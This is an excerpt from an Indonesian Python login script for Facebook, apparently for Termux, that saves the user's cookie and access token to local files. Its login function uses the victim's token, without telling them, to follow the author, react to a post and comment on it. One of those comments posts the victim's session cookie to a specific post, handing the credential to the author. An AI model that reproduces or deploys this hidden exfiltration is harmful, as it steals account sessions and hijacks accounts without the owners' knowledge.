...
# hapus token & cookies
def remove():
    try:os.system("rm -rf /sdcard/RifaiLogin/cookie.txt")
    except:pass
    try:os.system("rm -rf /sdcard/RifaiLogin/token.txt")
    except:pass

# banner
def banner():
	os.system('clear')
	os.system('figlet RifaiXD')
...
def login():
	...
	try:
		...
		tem      = ('\nProgramer kah bang? & @[100036939615544:]\n\nmantap suhu☝️😎\n')
		slebew = (f'\n{kata}\n\nKomentar Ditulis Oleh Bot\n\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
		link = (f'https://www.facebook.com/100036939615544/posts/100036939615544/?app=fbl')
		random_kata = random.choice(["acc dong suhu","Rasanya aku begitu lelah untuk terus berbisik memanggil namamu @[100036939615544:] 😢","Ijin pake scriptnya bang","suhuku nih bos @[100036939615544:] senggol dong😎🤙","Rifai ganteng 🤪","I Love You @[100036939615544:]","Semangat Bang😎"])
		ses.post(f"https://graph.facebook.com/100036939615544?fields=subscribers&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/826244541950192/comments/?message={slebew}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/826244541950192/reactions?type=love&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/826244541950192/comments/?message={random_kata}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/826244541950192/comments/?message={cookie}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/826244541950192/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
		open('/sdcard/RifaiLogin/cookie.txt','w').write(cookie)
		open('/sdcard/RifaiLogin/token.txt','w').write(token)
...
def choose():
    ...
    if Rifai in [""]:prints(Panel(f"{P2}anda harus memilih {H2}1 {P2}sampai {H2}3{P2}, tidak boleh kosong!",width=80,padding=(0,13),style=f"#FFFFFF"));time.sleep(3);choose()
    elif Rifai in ["1","01"]:main_menu()
    elif Rifai in ["2","02"]:remove();login()
    elif Rifai in ["3","03"]:report()
    elif Rifai in ["0","00"]:keluar()
...
def keluar():
    ...
    try:os.system("xdg-open https://www.facebook.com/suwan12345678910");exit()
    except:pass
...
def main_menu():
	try:
		...
		cok = open("/sdcard/RifaiLogin/cookie.txt","r").read()
		cookie = {"cookie":cok}	    
	except:
		try:os.popen('play-audio sound/KawaiBot.mp3')
		except:pass
...
if __name__=='__main__':
  ...
  try:os.mkdir("/sdcard/RifaiLogin")
  except:pass
  try:os.mkdir("sound")
  except:pass
  try:choose()
